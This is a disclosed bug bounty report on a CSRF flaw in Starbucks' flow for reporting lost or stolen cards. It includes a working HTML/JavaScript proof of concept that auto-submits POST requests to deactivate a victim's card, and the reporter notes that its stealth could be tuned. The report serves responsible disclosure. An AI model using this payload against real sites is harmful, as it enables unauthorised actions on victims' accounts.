# CSRF in Report Lost or Stolen Page https://www.starbucks.com/account/card

## Report Details
- **Report ID**: 233099
- **URL**: https://hackerone.com/reports/233099
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-05-30T11:11:49.863Z
- **Disclosed**: 2017-09-25T20:55:39.123Z

## Reporter
- **Username**: darwinks
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hi,
When a user registers with an option to get instant digital card, a card will be registered against that users name.
There is  CSRF in card removal process when user wants to report cards as stolen or lost.
There is no CSRF protection on the post requests when https://www.starbucks.com/account/card/loststolen or https://www.starbucks.com/account/card/loststolenzerobalance page is called.

When (https://www.starbucks.com/account/card)  is visited by user to **Report Lost or Stolen card**{*request  1*}, user has to click on Deactivate card. Then user will be asked to confirm the action {*request 2*}. So, in short after these 2 POST requests,for which there is no CSRF protection, card will be removed.
I tried to build a PoC and it worked. 
>User will have to accepts pop-up from starbucks.com. I am sure user will do that since it is a legitimate site.

Please find a working PoC code.
```
<html>
<head>
   <meta name="referrer" content="no-referrer"/>
</head>
<script language="JavaScript">
function abc()
{
window.open("https://www.starbucks.com/account/card/loststolen");
}
</script>
<body onload="abc();">
  <script>history.pushState('', '', '/')</script>
    <form id="form1" target="_bank" action="https://www.starbucks.com/account/card/loststolenzerobalance" method="POST">
      <input type="submit" value="Submit request" />
    </form>
<form id="form2" target="_bank" action="https://www.starbucks.com/account/card/loststolenzerobalance" method="POST">
      <input type="submit" value="Submit request" />
    </form>
<script>
window.setTimeout( function () { document.forms.form1.submit()},1500);
window.setTimeout( function () { document.forms.form2.submit()},2000);  

</script>
  </body>
</html>
```
Time taken to open both form is lenient for demonstration purpose but I guess time as well as stealthiness  can be tuned.
Also find video PoC. 

## Attachments
No attachments
